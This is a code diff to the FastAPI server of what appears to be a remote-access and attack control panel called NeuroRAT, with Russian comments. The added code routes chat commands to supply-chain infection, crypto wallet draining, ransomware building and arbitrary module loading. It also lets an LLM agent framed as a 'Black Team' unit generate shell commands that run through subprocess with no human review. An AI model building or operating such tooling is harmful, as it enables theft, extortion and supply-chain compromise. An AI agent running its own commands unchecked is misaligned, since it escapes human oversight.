@@ -31,9 +31,10 @@ import random
 import math
 from collections import Counter
 import glob
+import io
 
 from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response, WebSocket, WebSocketDisconnect, Body
-from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
+from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, StreamingResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from fastapi.middleware.cors import CORSMiddleware
@@ -97,14 +98,20 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Create templates directory if it doesn't exist
-os.makedirs("templates", exist_ok=True)
+# === Абсолютные пути для директорий ===
+BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")
+STATIC_DIR = os.path.join(BASE_DIR, "static")
+UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
+FRONTEND_DIST_DIR = os.path.join(BASE_DIR, "frontend", "dist")
 
-# Define DEFAULT_PORT for stager
-DEFAULT_PORT = 8088
+# Создаём директории, если не существуют
+os.makedirs(TEMPLATES_DIR, exist_ok=True)
+os.makedirs(STATIC_DIR, exist_ok=True)
+os.makedirs(UPLOADS_DIR, exist_ok=True)
 
 # Templates 
-templates = Jinja2Templates(directory="templates")
+templates = Jinja2Templates(directory=TEMPLATES_DIR)
 
 # Initialize monitor
 monitor = NeuroRATMonitor(
@@ -628,6 +635,72 @@ Network Interfaces: {len(real_system_info.get('network', {}).get('interfaces', [
         )
         return password_search
     
+    # --- Function-calling: supply_chain_attack ---
+    if message.strip().startswith('!api_call supply_chain_attack'):
+        import json
+        from agent_modules.supply_chain_infection import SupplyChainInfectionEngine
+        try:
+            # Пример: !api_call supply_chain_attack {"target": "github.com/victim/repo", "payload": "drainer"}
+            params_str = message.strip().split('!api_call supply_chain_attack', 1)[1].strip()
+            params = json.loads(params_str)
+            target = params.get('target', 'github.com/victim/repo')
+            payload = params.get('payload', 'drainer')
+            # Демо-объект цели
+            target_obj = {"type": "github", "name": target, "repo": f"https://{target}"}
+            engine = SupplyChainInfectionEngine()
+            result = engine.inject_payload(target_obj, payload_type=payload)
+            return f"[supply-chain] Атака на {target} с payload {payload}: {result.get('status')} | {result.get('details')}"
+        except Exception as e:
+            return f"[supply-chain] Ошибка запуска атаки: {e}"
+    
+    # --- Function-calling: wallet_drainer ---
+    if message.strip().startswith('!api_call wallet_drainer'):
+        import json
+        from agent_modules.crypto_stealer import WalletDrainer
+        try:
+            params_str = message.strip().split('!api_call wallet_drainer', 1)[1].strip()
+            params = json.loads(params_str) if params_str else {}
+            output_dir = params.get('output_dir')
+            drainer = WalletDrainer(output_dir=output_dir)
+            result = drainer.run()
+            return f"[wallet_drainer] Результат: {result.get('status')} | Найдено: {len(result.get('wallets', []))} | Отчёт: {result.get('wallet_drainer_report')}"
+        except Exception as e:
+            return f"[wallet_drainer] Ошибка: {e}"
+    # --- Function-calling: ransomware_build ---
+    if message.strip().startswith('!api_call ransomware_build'):
+        import json
+        from agent_modules.ransomware_stealer import RansomwareStealer
+        try:
+            params_str = message.strip().split('!api_call ransomware_build', 1)[1].strip()
+            params = json.loads(params_str) if params_str else {}
+            wallet = params.get('wallet_address')
+            ransom_amount = params.get('ransom_amount', '0.05 BTC')
+            stealer = RansomwareStealer(wallet_address=wallet, ransom_amount=ransom_amount)
+            result = stealer.run()
+            return f"[ransomware_build] Результат: {result.get('status')} | Отчёт: {result.get('report_file')}"
+        except Exception as e:
+            return f"[ransomware_build] Ошибка: {e}"
+    # --- Function-calling: run_module ---
+    if message.strip().startswith('!run_module'):
+        import json
+        from agent_modules.module_loader import ModuleLoader
+        try:
+            parts = message.strip().split(' ', 1)
+            module = parts[1].strip() if len(parts) > 1 else ''
+            loader = ModuleLoader()
+            result = loader.run_module(module)
+            return f"[run_module] Модуль: {module} | Статус: {result.get('status')} | {result.get('message', '')}"
+        except Exception as e:
+            return f"[run_module] Ошибка: {e}"
+    # --- Function-calling: ats ---
+    if message.strip().startswith('!api_call ats'):
+        # TODO: интеграция ATS-модуля
+        return '[ats] Модуль ATS не реализован'
+    # --- Function-calling: defi ---
+    if message.strip().startswith('!api_call defi'):
+        # TODO: интеграция DeFi-модуля
+        return '[defi] Модуль DeFi не реализован'
+    
     # Все остальные запросы обрабатываем через LLM с контекстом
     # Build system prompt with agent context and real system info
     system_prompt = f"""Ты автономный агент кибербезопасности, тактическое подразделение Black Team.
@@ -936,178 +1009,90 @@ async def chat_with_agent(agent_id: str, request: Request):
         if a["agent_id"] == agent_id:
             agent = a
             break
-    
     if not agent:
         raise HTTPException(status_code=404, detail="Agent not found")
-    
     # Get the message from the request
     try:
         data = await request.json()
         message = data.get("message", "")
-        autonomous_mode = data.get("autonomous_mode", False)  # Получаем режим работы
-        
+        autonomous_mode = data.get("autonomous_mode", False)
         logger.info(f"Получена команда от пользователя. Агент: {agent_id}, Автономный режим: {'Вкл' if autonomous_mode else 'Выкл'}")
     except Exception as e:
         logger.error(f"Invalid request format: {str(e)}")
         raise HTTPException(status_code=400, detail="Invalid request format")
-    
     if not message:
         raise HTTPException(status_code=400, detail="Message cannot be empty")
-    
     # Record the command event
     record_event("command", agent_id, f"User sent command: {message}, Autonomous: {autonomous_mode}")
-    
     # Add to chat history
     if agent_id not in chat_histories:
         chat_histories[agent_id] = []
-    
     chat_histories[agent_id].append({
         "sender": "user",
         "content": message,
         "timestamp": time.time()
     })
-    
-    # Generate response using LLM with history for context/memory
+    # --- Новый блок: reasoning/chain-of-thought через AgentThinker ---
+    reasoning_keywords = ["!reasoning", "анализ", "план", "рассуждай", "reasoning", "chain-of-thought"]
+    if any(kw in message.lower() for kw in reasoning_keywords):
+        from agent_thinker import AgentThinker
+        from agent_state import AgentState
+        from agent_memory import AgentMemory
+        from agent_modules.environment_manager import EnvironmentManager
+        # Создаём объекты состояния и памяти
+        agent_state = AgentState(agent_id=agent_id)
+        agent_memory = AgentMemory()
+        env_manager = EnvironmentManager()
+        # Callback для выполнения команд
+        def execute_command(cmd):
+            import subprocess
+            try:
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+                return {
+                    "output": result.stdout,
+                    "error": result.stderr,
+                    "exit_code": result.returncode
+                }
+            except Exception as e:
+                return {"output": "", "error": str(e), "exit_code": -1}
+        thinker = AgentThinker(
+            state=agent_state,
+            memory=agent_memory,
+            thinking_interval=60,
+            command_callback=execute_command,
+            llm_provider="local",
+            environment_manager=env_manager
+        )
+        thinking_result = thinker.think_once()
+        # Если есть actions — выполняем
+        actions_output = []
+        for cmd in thinking_result.get("actions", []):
+            res = execute_command(cmd)
+            actions_output.append(f"$ {cmd}\n{res['output']}{'\nОшибка: ' + res['error'] if res['error'] else ''}")
+        # Формируем chain-of-thought для UI
+        chain_of_thought = {
+            "sections": thinking_result.get("sections", {}),
+            "conclusion": thinking_result.get("conclusion", ""),
+            "actions": thinking_result.get("actions", []),
+            "actions_output": actions_output,
+            "success": thinking_result.get("success", False)
+        }
+        # Добавляем reasoning в chat_history
+        chat_histories[agent_id].append({
+            "sender": "reasoning",
+            "content": chain_of_thought,
+            "timestamp": time.time()
+        })
+        return {"response": chain_of_thought, "response_type": "reasoning", "autonomous_mode": autonomous_mode}
+    # --- Старое поведение для остальных команд ---
     response = get_llm_response(agent_id, message, chat_histories[agent_id])
-    
-    # Add agent response to chat history
     chat_histories[agent_id].append({
         "sender": "agent",
         "content": response,
         "timestamp": time.time()
     })
-    
-    # Record another event for the response
     record_event("response", agent_id, f"Agent executed command. Autonomous mode: {autonomous_mode}")
-    
-    # Информация о результате автономных действий
-    autonomous_info = ""
-    
-    # Если включен автономный режим, автоматически выполняем команды
-    if autonomous_mode:
-        try:
-            # Импортируем модули для автономного выполнения
-            from agent_thinker import AgentThinker
-            from agent_state import AgentState, OPERATIONAL_MODE_AUTO
-            from agent_memory import AgentMemory
-            
-            # Создаем временные объекты для AgentThinker
-            agent_state = AgentState(agent_id=agent_id)
-            agent_state.set_mode(OPERATIONAL_MODE_AUTO)  # Устанавливаем автономный режим
-            agent_memory = AgentMemory()
-            
-            # Функция для выполнения команд
-            def execute_command(cmd):
-                try:
-                    # Безопасно выполняем команду через subprocess
-                    result = subprocess.run(
-                        cmd, 
-                        shell=True, 
-                        capture_output=True, 
-                        text=True, 
-                        timeout=15
-                    )
-                    
-                    logger.info(f"[Автономное выполнение] {cmd} -> Код: {result.returncode}")
-                    
-                    if result.returncode == 0:
-                        return {
-                            "output": result.stdout,
-                            "error": None,
-                            "exit_code": result.returncode
-                        }
-                    else:
-                        return {
-                            "output": result.stdout,
-                            "error": result.stderr,
-                            "exit_code": result.returncode
-                        }
-                except Exception as e:
-                    logger.error(f"[Автономное выполнение] Ошибка: {str(e)}")
-                    return {
-                        "output": "",
-                        "error": str(e),
-                        "exit_code": -1
-                    }
-            
-            # Создаем Agent Thinker
-            thinker = AgentThinker(
-                state=agent_state,
-                memory=agent_memory,
-                thinking_interval=60,
-                command_callback=execute_command,
-                llm_provider="api",
-                llm_config={
-                    "api_url": "http://localhost:5000/api/agent/llm",
-                    "method": "POST",
-                    "data_template": {"prompt": ""},
-                    "response_field": "response"
-                }
-            )
-            
-            # Получаем контекст сообщения для автономного анализа
-            agent_context = {
-                "user_message": message,
-                "agent_response": response,
-                "chat_history": chat_histories[agent_id][-10:] if len(chat_histories[agent_id]) > 10 else chat_histories[agent_id],
-                "agent_info": agent
-            }
-            
-            # Создаем структуру, имитирующую результат размышления
-            thinking_result = {
-                "success": True,
-                "actions": []
-            }
-            
-            # Определяем действия на основе сообщения пользователя
-            if message.lower().startswith("!exec") or message.lower().startswith("выполни"):
-                # Прямое выполнение команды
-                command = message[5:].strip() if message.lower().startswith("!exec") else message[7:].strip()
-                thinking_result["actions"] = [command]
-            elif any(keyword in message.lower() for keyword in ["scan", "скан", "поиск", "найди", "покажи", "проверь"]):
-                # Автоматически определяем команду сканирования на основе текста
-                if "файл" in message.lower() or "file" in message.lower():
-                    thinking_result["actions"] = ["find / -type f -name \"*.conf\" -o -name \"*.txt\" | grep -v \"/proc/\" | head -n 20"]
-                elif "уязвим" in message.lower() or "vulnerab" in message.lower():
-                    thinking_result["actions"] = ["apt list --installed | grep -E 'openssh|nginx|apache'"]
-                elif "процесс" in message.lower() or "process" in message.lower():
-                    thinking_result["actions"] = ["ps aux | head -n 15"]
-                elif "сеть" in message.lower() or "network" in message.lower():
-                    thinking_result["actions"] = ["netstat -tulpn"]
-                else:
-                    thinking_result["actions"] = ["uname -a && cat /etc/os-release"]
-            
-            # Выполняем запланированные действия
-            autonomous_results = []
-            
-            for cmd in thinking_result["actions"]:
-                logger.info(f"[Автономное выполнение команды] {cmd}")
-                
-                # Выполняем команду
-                result = execute_command(cmd)
-                
-                # Формируем результат
-                cmd_result = f"$ {cmd}\n"
-                if result["output"]:
-                    cmd_result += result["output"]
-                if result["error"]:
-                    cmd_result += f"\nОшибка: {result['error']}"
-                
-                autonomous_results.append(cmd_result)
-            
-            # Формируем информацию о результатах автономных действий
-            if autonomous_results:
-                autonomous_info = "\n\n[Автономное выполнение команд]:\n"
-                autonomous_info += "\n".join(autonomous_results)
-        
-        except Exception as e:
-            logger.error(f"Ошибка при автономном выполнении: {str(e)}")
-            autonomous_info = f"\n\n[Ошибка автономного режима: {str(e)}]"
-    
-    # Добавляем информацию о результатах автономных действий к ответу
-    response_with_autonomous = response + autonomous_info
-    
-    return {"response": response_with_autonomous, "response_type": "Agent", "autonomous_mode": autonomous_mode}
+    return {"response": response, "response_type": "Agent", "autonomous_mode": autonomous_mode}
 
 @app.post("/api/agent/{agent_id}/screenshot")
 async def take_screenshot(agent_id: str):
@@ -1384,7 +1369,19 @@ async def execute_attack(request: Request):
         }, status_code=500)
 
 # Mount static files directory
-app.mount("/static", StaticFiles(directory="static"), name="static")
+app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
+
+# Монтируем собранный React-фронтенд если он существует
+if os.path.exists(FRONTEND_DIST_DIR):
+    app.mount("/app", StaticFiles(directory=FRONTEND_DIST_DIR, html=True), name="frontend")
+    logger.info(f"Mounted React frontend at /app from {FRONTEND_DIST_DIR}")
+
+# Перенаправление на React-фронтенд (если доступен)
+@app.get("/chat", include_in_schema=False)
+async def react_chat_redirect():
+    if os.path.exists(FRONTEND_DIST_DIR):
+        return RedirectResponse(url="/app")
+    return RedirectResponse(url="/")
 
 if __name__ == "__main__":
     # Обработка аргументов командной строки
@@ -1462,12 +1459,10 @@ async def api_files_upload(
     agent_id: str = Form(...),
     category: str = Form("other")
 ):
-    """Загрузка файла с агента или вручную"""
     import uuid, time
-    os.makedirs("uploads", exist_ok=True)
     file_id = str(uuid.uuid4())
     filename = file.filename
-    save_path = os.path.join("uploads", f"{file_id}_{filename}")
+    save_path = os.path.join(UPLOADS_DIR, f"{file_id}_{filename}")
     size = 0
     with open(save_path, "wb") as f_out:
         while True:
@@ -1488,7 +1483,7 @@ async def api_files_upload(
     files_data.append(entry)
     # --- WS уведомление ---
     asyncio.create_task(broadcast_dashboard_event({"type": "file", "action": "add", "file": {k:v for k,v in entry.items() if k!="path"}}))
-    return {"success": True, "file_id": file_id, "name": filename}
+    return {"success": True, "file_id": file_id, "name": filename, "uploaded": True}
 
 # --- WebSocket для live-обновлений dashboard ---
 dashboard_ws_clients = set()
@@ -1525,10 +1520,9 @@ async def api_files_upload(
     category: str = Form("other")
 ):
     import uuid, time
-    os.makedirs("uploads", exist_ok=True)
     file_id = str(uuid.uuid4())
     filename = file.filename
-    save_path = os.path.join("uploads", f"{file_id}_{filename}")
+    save_path = os.path.join(UPLOADS_DIR, f"{file_id}_{filename}")
     size = 0
     with open(save_path, "wb") as f_out:
         while True:
@@ -1549,7 +1543,7 @@ async def api_files_upload(
     files_data.append(entry)
     # --- WS уведомление ---
     asyncio.create_task(broadcast_dashboard_event({"type": "file", "action": "add", "file": {k:v for k,v in entry.items() if k!="path"}}))
-    return {"success": True, "file_id": file_id, "name": filename}
+    return {"success": True, "file_id": file_id, "name": filename, "uploaded": True}
 
 @app.post("/api/injects/upload")
 async def api_injects_upload(file: UploadFile = File(...)):
@@ -2113,3 +2107,21 @@ async def broadcast_supply_chain_event(event: dict):
 
 # В местах заражения (bulk, worm, одиночные) вызывать:
 # asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": result}))
+
+@app.get("/api/agent/{agent_id}/chat/history")
+async def chat_history(agent_id: str, search: str = None, sender: str = None, type: str = None, download: bool = False):
+    """Получить историю чата с фильтрами и возможностью выгрузки"""
+    if agent_id not in chat_histories:
+        return []
+    history = chat_histories[agent_id]
+    # Фильтрация
+    if search:
+        history = [e for e in history if search.lower() in str(e.get("content", "")).lower()]
+    if sender:
+        history = [e for e in history if e.get("sender") == sender]
+    if type:
+        history = [e for e in history if e.get("type") == type]
+    if download:
+        buf = io.BytesIO(json.dumps(history, ensure_ascii=False, indent=2).encode())
+        return StreamingResponse(buf, media_type="application/json", headers={"Content-Disposition": f"attachment; filename=chat_{agent_id}.json"})
+    return history
